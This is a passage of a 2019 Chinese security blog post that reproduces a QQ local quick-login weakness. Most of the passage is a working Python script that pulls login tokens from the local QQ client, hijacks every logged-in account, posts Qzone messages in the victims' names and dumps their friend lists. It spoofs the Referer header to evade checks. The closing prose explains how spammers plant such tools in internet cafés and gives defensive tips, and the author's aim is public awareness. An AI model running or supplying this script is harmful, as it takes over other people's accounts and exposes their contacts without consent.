+<span id="cb10-29"><a href="#cb10-29" aria-hidden="true" tabindex="-1"></a>                      <span class="st">&quot;pt_qr_link=http%3A//z.qzone.com/download.html&amp;self_regurl=https%3A//qzs.qq.com/qzone/v6/reg/index.html&amp;&quot;</span> \</span>
+<span id="cb10-30"><a href="#cb10-30" aria-hidden="true" tabindex="-1"></a>                      <span class="st">&quot;pt_qr_help_link=http%3A//z.qzone.com/download.html&amp;pt_no_auth=1&quot;</span></span>
+<span id="cb10-31"><a href="#cb10-31" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-32"><a href="#cb10-32" aria-hidden="true" tabindex="-1"></a><span class="co"># Header头Referer字段必须为qq.com</span></span>
+<span id="cb10-33"><a href="#cb10-33" aria-hidden="true" tabindex="-1"></a>login_session <span class="op">=</span> requests.Session()</span>
+<span id="cb10-34"><a href="#cb10-34" aria-hidden="true" tabindex="-1"></a>res <span class="op">=</span> login_session.get(get_local_token_url, headers<span class="op">=</span>header)</span>
+<span id="cb10-35"><a href="#cb10-35" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-36"><a href="#cb10-36" aria-hidden="true" tabindex="-1"></a><span class="co"># 获取关键参数pt_local_token</span></span>
+<span id="cb10-37"><a href="#cb10-37" aria-hidden="true" tabindex="-1"></a>pt_local_token <span class="op">=</span> res.cookies.get(<span class="st">&quot;pt_local_token&quot;</span>)</span>
+<span id="cb10-38"><a href="#cb10-38" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-39"><a href="#cb10-39" aria-hidden="true" tabindex="-1"></a><span class="co"># 带着刚才的Cookie以及从Cookie中拿到的pt_local_tk对本地服务器进行请求</span></span>
+<span id="cb10-40"><a href="#cb10-40" aria-hidden="true" tabindex="-1"></a><span class="co"># 获取已登录的账号信息</span></span>
+<span id="cb10-41"><a href="#cb10-41" aria-hidden="true" tabindex="-1"></a>port <span class="op">=</span> <span class="dv">4301</span></span>
+<span id="cb10-42"><a href="#cb10-42" aria-hidden="true" tabindex="-1"></a>local_qq_server_url <span class="op">=</span> <span class="st">&quot;https://localhost.ptlogin2.qq.com&quot;</span>  <span class="co"># 建立在本地的QQ服务器地址，等待应用与其交互</span></span>
+<span id="cb10-43"><a href="#cb10-43" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-44"><a href="#cb10-44" aria-hidden="true" tabindex="-1"></a><span class="co"># 传参获取本地已登录账号信息</span></span>
+<span id="cb10-45"><a href="#cb10-45" aria-hidden="true" tabindex="-1"></a>get_QQ_num_url <span class="op">=</span> local_qq_server_url <span class="op">+</span> <span class="op">\</span></span>
+<span id="cb10-46"><a href="#cb10-46" aria-hidden="true" tabindex="-1"></a>                 <span class="st">&quot;:</span><span class="sc">&#123;&#125;</span><span class="st">/pt_get_uins?callback=ptui_getuins_CB&amp;r=0.7068102287925351&amp;pt_local_tk=</span><span class="sc">&#123;&#125;</span><span class="st">&quot;</span>.<span class="bu">format</span>(port,</span>
+<span id="cb10-47"><a href="#cb10-47" aria-hidden="true" tabindex="-1"></a>                                                                                                       pt_local_token)</span>
+<span id="cb10-48"><a href="#cb10-48" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-49"><a href="#cb10-49" aria-hidden="true" tabindex="-1"></a>res <span class="op">=</span> login_session.get(get_QQ_num_url, headers<span class="op">=</span>header)</span>
+<span id="cb10-50"><a href="#cb10-50" aria-hidden="true" tabindex="-1"></a><span class="co"># 返回的账号信息是一段js的数组</span></span>
+<span id="cb10-51"><a href="#cb10-51" aria-hidden="true" tabindex="-1"></a>dic_str <span class="op">=</span> <span class="va">None</span></span>
+<span id="cb10-52"><a href="#cb10-52" aria-hidden="true" tabindex="-1"></a><span class="cf">try</span>:</span>
+<span id="cb10-53"><a href="#cb10-53" aria-hidden="true" tabindex="-1"></a>    dic_str <span class="op">=</span> re.findall(<span class="st">&quot;var var_sso_uin_list=(\[[\s\S]*?\])&quot;</span>, res.text)[<span class="dv">0</span>]</span>
+<span id="cb10-54"><a href="#cb10-54" aria-hidden="true" tabindex="-1"></a><span class="cf">except</span> <span class="pp">IndexError</span>:</span>
+<span id="cb10-55"><a href="#cb10-55" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">&quot;Fail to get local account info. &quot;</span>)</span>
+<span id="cb10-56"><a href="#cb10-56" aria-hidden="true" tabindex="-1"></a>    exit(<span class="dv">0</span>)</span>
+<span id="cb10-57"><a href="#cb10-57" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-58"><a href="#cb10-58" aria-hidden="true" tabindex="-1"></a><span class="co"># ====================================== 显示本地登录账号信息 ===========================================</span></span>
+<span id="cb10-59"><a href="#cb10-59" aria-hidden="true" tabindex="-1"></a>account_list <span class="op">=</span> <span class="bu">eval</span>(dic_str)</span>
+<span id="cb10-60"><a href="#cb10-60" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="st">&quot;Detect </span><span class="sc">&#123;&#125;</span><span class="st"> account login locally&quot;</span>.<span class="bu">format</span>(<span class="bu">len</span>(account_list)))</span>
+<span id="cb10-61"><a href="#cb10-61" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="st">&quot;=====================================================&quot;</span>)</span>
+<span id="cb10-62"><a href="#cb10-62" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-63"><a href="#cb10-63" aria-hidden="true" tabindex="-1"></a>account_num_list <span class="op">=</span> []</span>
+<span id="cb10-64"><a href="#cb10-64" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="bu">len</span>(account_list)):</span>
+<span id="cb10-65"><a href="#cb10-65" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">&quot;NO.</span><span class="sc">&#123;&#125;</span><span class="st">&quot;</span>.<span class="bu">format</span>(i <span class="op">+</span> <span class="dv">1</span>))</span>
+<span id="cb10-66"><a href="#cb10-66" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">&quot;account:</span><span class="sc">&#123;&#125;</span><span class="ch">\n</span><span class="st">nickname:</span><span class="sc">&#123;&#125;</span><span class="st">&quot;</span>.<span class="bu">format</span>(account_list[i].get(<span class="st">&quot;account&quot;</span>), account_list[i].get(<span class="st">&quot;nickname&quot;</span>)))</span>
+<span id="cb10-67"><a href="#cb10-67" aria-hidden="true" tabindex="-1"></a>    account_num_list.append(account_list[i].get(<span class="st">&quot;account&quot;</span>))</span>
+<span id="cb10-68"><a href="#cb10-68" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="st">&quot;=====================================================&quot;</span>)</span>
+<span id="cb10-69"><a href="#cb10-69" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-70"><a href="#cb10-70" aria-hidden="true" tabindex="-1"></a><span class="co"># ====================================== 对每个账号进行快捷登录 ===========================================</span></span>
+<span id="cb10-71"><a href="#cb10-71" aria-hidden="true" tabindex="-1"></a><span class="co"># ===================================== 以登录QQ空间发个说说为例 ==========================================</span></span>
+<span id="cb10-72"><a href="#cb10-72" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-73"><a href="#cb10-73" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-74"><a href="#cb10-74" aria-hidden="true" tabindex="-1"></a><span class="co"># 对于已登录的账号</span></span>
+<span id="cb10-75"><a href="#cb10-75" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> account <span class="kw">in</span> account_num_list:</span>
+<span id="cb10-76"><a href="#cb10-76" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 发送QQ号码及pt_local_token参数到本地服务器获取必要的Cookie，以便获取远程服务器登录许可</span></span>
+<span id="cb10-77"><a href="#cb10-77" aria-hidden="true" tabindex="-1"></a>    get_QQ_cookie_url <span class="op">=</span> local_qq_server_url <span class="op">+</span> <span class="op">\</span></span>
+<span id="cb10-78"><a href="#cb10-78" aria-hidden="true" tabindex="-1"></a>                        <span class="st">&quot;:</span><span class="sc">&#123;&#125;</span><span class="st">/pt_get_st?callback=ptui_getst_CB&amp;&quot;</span> \</span>
+<span id="cb10-79"><a href="#cb10-79" aria-hidden="true" tabindex="-1"></a>                        <span class="st">&quot;r=0.7068102287925351&amp;&quot;</span> \</span>
+<span id="cb10-80"><a href="#cb10-80" aria-hidden="true" tabindex="-1"></a>                        <span class="st">&quot;pt_local_tk=</span><span class="sc">&#123;&#125;</span><span class="st">&amp;&quot;</span> \</span>
+<span id="cb10-81"><a href="#cb10-81" aria-hidden="true" tabindex="-1"></a>                        <span class="st">&quot;clientuin=</span><span class="sc">&#123;&#125;</span><span class="st">&quot;</span>.<span class="bu">format</span>(port,</span>
+<span id="cb10-82"><a href="#cb10-82" aria-hidden="true" tabindex="-1"></a>                                              pt_local_token,</span>
+<span id="cb10-83"><a href="#cb10-83" aria-hidden="true" tabindex="-1"></a>                                              account)</span>
+<span id="cb10-84"><a href="#cb10-84" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-85"><a href="#cb10-85" aria-hidden="true" tabindex="-1"></a>    res <span class="op">=</span> login_session.get(get_QQ_cookie_url, headers<span class="op">=</span>header)</span>
+<span id="cb10-86"><a href="#cb10-86" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 获取远程登录凭证</span></span>
+<span id="cb10-87"><a href="#cb10-87" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 其中u1为QQ空间地址（抓包可获得）</span></span>
+<span id="cb10-88"><a href="#cb10-88" aria-hidden="true" tabindex="-1"></a>    login_url <span class="op">=</span> <span class="st">&quot;https://ssl.ptlogin2.qq.com/jump?clientuin=</span><span class="sc">&#123;&#125;</span><span class="st">&amp;&quot;</span> \</span>
+<span id="cb10-89"><a href="#cb10-89" aria-hidden="true" tabindex="-1"></a>                <span class="st">&quot;keyindex=9&amp;&quot;</span> \</span>
+<span id="cb10-90"><a href="#cb10-90" aria-hidden="true" tabindex="-1"></a>                <span class="st">&quot;pt_aid=549000912&amp;&quot;</span> \</span>
+<span id="cb10-91"><a href="#cb10-91" aria-hidden="true" tabindex="-1"></a>                <span class="st">&quot;daid=5&amp;&quot;</span> \</span>
+<span id="cb10-92"><a href="#cb10-92" aria-hidden="true" tabindex="-1"></a>                <span class="st">&quot;u1=https%3A</span><span class="sc">%2F%2F</span><span class="st">qzs.qzone.qq.com</span><span class="sc">%2F</span><span class="st">qzone</span><span class="sc">%2F</span><span class="st">v5</span><span class="sc">%2F</span><span class="st">loginsucc.html</span><span class="sc">%3F</span><span class="st">para%3Dizone&amp;&quot;</span> \</span>
+<span id="cb10-93"><a href="#cb10-93" aria-hidden="true" tabindex="-1"></a>                <span class="st">&quot;pt_local_tk=</span><span class="sc">&#123;&#125;</span><span class="st">&amp;&quot;</span> \</span>
+<span id="cb10-94"><a href="#cb10-94" aria-hidden="true" tabindex="-1"></a>                <span class="st">&quot;pt_3rd_aid=0&amp;&quot;</span> \</span>
+<span id="cb10-95"><a href="#cb10-95" aria-hidden="true" tabindex="-1"></a>                <span class="st">&quot;ptopt=1&amp;style=40&quot;</span>.<span class="bu">format</span>(account, pt_local_token)</span>
+<span id="cb10-96"><a href="#cb10-96" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-97"><a href="#cb10-97" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 按照抓包获得的请求照样地设置了一下Referer 免得有检测</span></span>
+<span id="cb10-98"><a href="#cb10-98" aria-hidden="true" tabindex="-1"></a>    login_session.headers[<span class="st">&#39;Referer&#39;</span>] <span class="op">=</span> get_local_token_url</span>
+<span id="cb10-99"><a href="#cb10-99" aria-hidden="true" tabindex="-1"></a>    res <span class="op">=</span> login_session.get(login_url)</span>
+<span id="cb10-100"><a href="#cb10-100" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 至此获取凭证(clientkey)成功,下面获取p_skey</span></span>
+<span id="cb10-101"><a href="#cb10-101" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-102"><a href="#cb10-102" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 到此处会有个check操作，需要GET去请求验证一下上一个请求响应内容给的地址</span></span>
+<span id="cb10-103"><a href="#cb10-103" aria-hidden="true" tabindex="-1"></a>    <span class="co"># ============================================ 获取p_skey ===================================================</span></span>
+<span id="cb10-104"><a href="#cb10-104" aria-hidden="true" tabindex="-1"></a>    zone_login_check_url <span class="op">=</span> <span class="va">None</span></span>
+<span id="cb10-105"><a href="#cb10-105" aria-hidden="true" tabindex="-1"></a>    <span class="cf">try</span>:</span>
+<span id="cb10-106"><a href="#cb10-106" aria-hidden="true" tabindex="-1"></a>        <span class="co"># 获取认证地址及参数</span></span>
+<span id="cb10-107"><a href="#cb10-107" aria-hidden="true" tabindex="-1"></a>        zone_login_check_url <span class="op">=</span> re.findall(<span class="st">&quot;&#39;(http.*?)&#39;&quot;</span>, res.text)[<span class="dv">0</span>]</span>
+<span id="cb10-108"><a href="#cb10-108" aria-hidden="true" tabindex="-1"></a>    <span class="cf">except</span> <span class="pp">IndexError</span>:</span>
+<span id="cb10-109"><a href="#cb10-109" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="st">&#39;Fail to get login token .&#39;</span>)</span>
+<span id="cb10-110"><a href="#cb10-110" aria-hidden="true" tabindex="-1"></a>        exit(<span class="dv">0</span>)</span>
+<span id="cb10-111"><a href="#cb10-111" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 发起认证请求</span></span>
+<span id="cb10-112"><a href="#cb10-112" aria-hidden="true" tabindex="-1"></a>    res <span class="op">=</span> login_session.get(zone_login_check_url)</span>
+<span id="cb10-113"><a href="#cb10-113" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 一样的补一下Referer和UA</span></span>
+<span id="cb10-114"><a href="#cb10-114" aria-hidden="true" tabindex="-1"></a>    login_session.headers[<span class="st">&#39;Referer&#39;</span>] <span class="op">=</span> <span class="st">&quot;https://qzs.qzone.qq.com/qzone/v5/loginsucc.html?para=izone&quot;</span></span>
+<span id="cb10-115"><a href="#cb10-115" aria-hidden="true" tabindex="-1"></a>    login_session.headers[</span>
+<span id="cb10-116"><a href="#cb10-116" aria-hidden="true" tabindex="-1"></a>        <span class="st">&#39;User-Agent&#39;</span>] <span class="op">=</span> <span class="st">&quot;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36&quot;</span></span>
+<span id="cb10-117"><a href="#cb10-117" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 请求对应账号的空间，获取发送说说必要参数——qzone_token(响应的JS里面获取)以及p_skey(cookie中获取)</span></span>
+<span id="cb10-118"><a href="#cb10-118" aria-hidden="true" tabindex="-1"></a>    res <span class="op">=</span> login_session.get(<span class="st">&quot;https://user.qzone.qq.com/</span><span class="sc">&#123;&#125;</span><span class="st">&quot;</span>.<span class="bu">format</span>(account))</span>
+<span id="cb10-119"><a href="#cb10-119" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-120"><a href="#cb10-120" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 获取必要参数p_skey用来计算CSRFToken</span></span>
+<span id="cb10-121"><a href="#cb10-121" aria-hidden="true" tabindex="-1"></a>    p_skey <span class="op">=</span> login_session.cookies.get(<span class="st">&quot;p_skey&quot;</span>)</span>
+<span id="cb10-122"><a href="#cb10-122" aria-hidden="true" tabindex="-1"></a>    g_tk <span class="op">=</span> getACSRFToken(p_skey)  <span class="co"># 计算CSRFToken</span></span>
+<span id="cb10-123"><a href="#cb10-123" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 从响应的页面JS中获取qzone_token</span></span>
+<span id="cb10-124"><a href="#cb10-124" aria-hidden="true" tabindex="-1"></a>    res.encoding <span class="op">=</span> <span class="st">&#39;utf-8&#39;</span></span>
+<span id="cb10-125"><a href="#cb10-125" aria-hidden="true" tabindex="-1"></a>    qzone_token <span class="op">=</span> re.findall(<span class="st">&#39;window.g_qzonetoken = \(function\(\)&#123; try\&#123;return &quot;([0-9a-fA-F]+?)&quot;;\&#125;&#39;</span>, res.text)[<span class="dv">0</span>]</span>
+<span id="cb10-126"><a href="#cb10-126" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-127"><a href="#cb10-127" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 发送说说的地址（抓包可得），并传入刚才获取的qzone_token以及g_tk</span></span>
+<span id="cb10-128"><a href="#cb10-128" aria-hidden="true" tabindex="-1"></a>    post_comment_url <span class="op">=</span> <span class="st">&quot;https://user.qzone.qq.com/proxy/domain/taotao.qzone.qq.com/cgi-bin/emotion_cgi_publish_v6?&quot;</span> \</span>
+<span id="cb10-129"><a href="#cb10-129" aria-hidden="true" tabindex="-1"></a>                       <span class="st">&quot;qzonetoken=</span><span class="sc">&#123;&#125;</span><span class="st">&amp;g_tk=</span><span class="sc">&#123;&#125;</span><span class="st">&quot;</span>.<span class="bu">format</span>(qzone_token, g_tk)</span>
+<span id="cb10-130"><a href="#cb10-130" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 补一下Content-Type</span></span>
+<span id="cb10-131"><a href="#cb10-131" aria-hidden="true" tabindex="-1"></a>    login_session.headers[<span class="st">&quot;Content-Type&quot;</span>] <span class="op">=</span> <span class="st">&quot;application/x-www-form-urlencoded&quot;</span></span>
+<span id="cb10-132"><a href="#cb10-132" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 发送说说的必要参数（抓包可得），其中con字段及说说内容</span></span>
+<span id="cb10-133"><a href="#cb10-133" aria-hidden="true" tabindex="-1"></a>    param <span class="op">=</span> &#123;<span class="st">&quot;syn_tweet_verson&quot;</span>: <span class="st">&quot;1&quot;</span>, <span class="st">&quot;paramstr&quot;</span>: <span class="st">&quot;1&quot;</span>, <span class="st">&quot;pic_template&quot;</span>: <span class="st">&quot;&quot;</span>, <span class="st">&quot;richtype&quot;</span>: <span class="st">&quot;&quot;</span>, <span class="st">&quot;richval&quot;</span>: <span class="st">&quot;&quot;</span>,</span>
+<span id="cb10-134"><a href="#cb10-134" aria-hidden="true" tabindex="-1"></a>             <span class="st">&quot;special_url&quot;</span>: <span class="st">&quot;&quot;</span>, <span class="st">&quot;subrichtype&quot;</span>: <span class="st">&quot;&quot;</span>, <span class="st">&quot;who&quot;</span>: <span class="st">&quot;1&quot;</span>, <span class="st">&quot;con&quot;</span>: Message, <span class="st">&quot;feedversion&quot;</span>: <span class="st">&quot;1&quot;</span>,</span>
+<span id="cb10-135"><a href="#cb10-135" aria-hidden="true" tabindex="-1"></a>             <span class="st">&quot;ver&quot;</span>: <span class="st">&quot;1&quot;</span>, <span class="st">&quot;ugc_right&quot;</span>: <span class="st">&quot;1&quot;</span>, <span class="st">&quot;to_sign&quot;</span>: <span class="st">&quot;0&quot;</span>, <span class="st">&quot;hostuin&quot;</span>: <span class="st">&quot;&lt;Your QQ number&gt;&quot;</span>, <span class="st">&quot;code_version&quot;</span>: <span class="st">&quot;1&quot;</span>, <span class="st">&quot;format&quot;</span>: <span class="st">&quot;fs&quot;</span>,</span>
+<span id="cb10-136"><a href="#cb10-136" aria-hidden="true" tabindex="-1"></a>             <span class="st">&quot;qzreferrer&quot;</span>: <span class="st">&quot;https%3A</span><span class="sc">%2F%2F</span><span class="st">user.qzone.qq.com</span><span class="sc">%2F</span><span class="st">&lt;Your QQ number&gt;&quot;</span>&#125;</span>
+<span id="cb10-137"><a href="#cb10-137" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 发送说说</span></span>
+<span id="cb10-138"><a href="#cb10-138" aria-hidden="true" tabindex="-1"></a>    res <span class="op">=</span> login_session.post(post_comment_url, data<span class="op">=</span>param)</span>
+<span id="cb10-139"><a href="#cb10-139" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> res.status_code <span class="op">==</span> <span class="dv">200</span>:</span>
+<span id="cb10-140"><a href="#cb10-140" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="st">&quot;[+] Account </span><span class="sc">&#123;&#125;</span><span class="st"> send message successfully.&quot;</span>.<span class="bu">format</span>(account))</span>
+<span id="cb10-141"><a href="#cb10-141" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-142"><a href="#cb10-142" aria-hidden="true" tabindex="-1"></a>    <span class="co"># ================================================= 获取好友列表 =====================================================</span></span>
+<span id="cb10-143"><a href="#cb10-143" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 接口地址</span></span>
+<span id="cb10-144"><a href="#cb10-144" aria-hidden="true" tabindex="-1"></a>    get_friends_url <span class="op">=</span> <span class="st">&quot;https://h5.qzone.qq.com/proxy/domain/r.qzone.qq.com/cgi-bin/tfriend/friend_show_qqfriends.cgi?&quot;</span> \</span>
+<span id="cb10-145"><a href="#cb10-145" aria-hidden="true" tabindex="-1"></a>                      <span class="st">&quot;uin=</span><span class="sc">&#123;&#125;</span><span class="st">&amp;follow_flag=1&amp;&quot;</span> \</span>
+<span id="cb10-146"><a href="#cb10-146" aria-hidden="true" tabindex="-1"></a>                      <span class="st">&quot;groupface_flag=0&amp;fupdate=1&amp;&quot;</span> \</span>
+<span id="cb10-147"><a href="#cb10-147" aria-hidden="true" tabindex="-1"></a>                      <span class="st">&quot;g_tk=</span><span class="sc">&#123;&#125;</span><span class="st">&quot;</span>.<span class="bu">format</span>(account, g_tk)</span>
+<span id="cb10-148"><a href="#cb10-148" aria-hidden="true" tabindex="-1"></a>    res <span class="op">=</span> login_session.get(get_friends_url)</span>
+<span id="cb10-149"><a href="#cb10-149" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">&quot;QQ friends info.&quot;</span>)</span>
+<span id="cb10-150"><a href="#cb10-150" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(res.text)</span>
+<span id="cb10-151"><a href="#cb10-151" aria-hidden="true" tabindex="-1"></a></span></code></pre></div>
+<h2 id="写在最后">写在最后</h2>
+<p>这一些接口其实我们都很熟悉Web页面的快捷登录，这一些操作就是模拟了浏览器或者说软件强制代替你进行了快捷登录。注意是运行在本地上的任何软件都可以做到这个目的。所以账号密码并没有被盗取，而是被一些恶意的软件盗取的登录凭证，代替你发送了垃圾信息。当然我没有讨论如何绕过网吧的还原机制，这又是另一码事了。
+一些图谋不轨的人就将这些接口凑起来，写个软件种在网吧等公共上网设施，等待上Q的人帮他进行一些黑产行为，如在QQ群，空间里面发博彩、色情信息以及广告，进行牟利。这些技术并不复杂，很多初中甚至小学文化的“大黑阔”都可以写出来。</p>
+<p>对于其他非计算机行业的人，很多都可能遭遇过这类情况，但又无从知晓，也渐渐地神秘化了这帮人。</p>
+<p>写此一文也权当是一个科普，希望对读者有所收获。</p>
+<p>防范措施：</p>
+<ol type="1">
+<li>在公共场合尽量不登录QQ，毕竟谁都可以帮你发一些奇奇怪怪的东西</li>
+<li>若发现自己账号异常，开始乱发东西时，第一时间修改密码会导致“大黑阔”获取的cookie瞬间失效，可以立即停止发送垃圾信息</li>
+<li>然后就可以进行删除说说，发群道歉或者像我这样写一篇文章进行面子的最后补救了</li>
+</ol>
+<p>最后祝你生活愉快，大黑阔 :)</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>T3stzer0</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://testzero-wz.github.io/2019/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1QQ%E6%9C%AC%E5%9C%B0%E5%BF%AB%E6%8D%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://testzero-wz.github.io/2019/01/22/%E8%AE%B0%E4%B8%80%E6%AC%A1QQ%E6%9C%AC%E5%9C%B0%E5%BF%AB%E6%8D%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/blog/tag/%E7%A0%81%E4%BB%A3%E7%A0%81/"># 码代码</a>
+                    
+                        <a href="/blog/tag/%E6%B8%97%E9%80%8F/"># 渗透</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/blog/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/blog/2019/12/02/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%AE%9E%E8%B7%B5/">Redis 未授权主从复制原理解析与实践</a>
+            
+            
+            <a class="next" rel="next" href="/blog/2018/10/22/%E5%9F%BA%E4%BA%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84Web%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E6%A3%80%E6%B5%8B%E5%AE%9E%E8%B7%B5/">基于机器学习的Web日志异常检测实践</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <!-- 
+<footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© T3stzer0 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+-->
+<script src="/js/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+
+    </div>
+</body>
+</html>
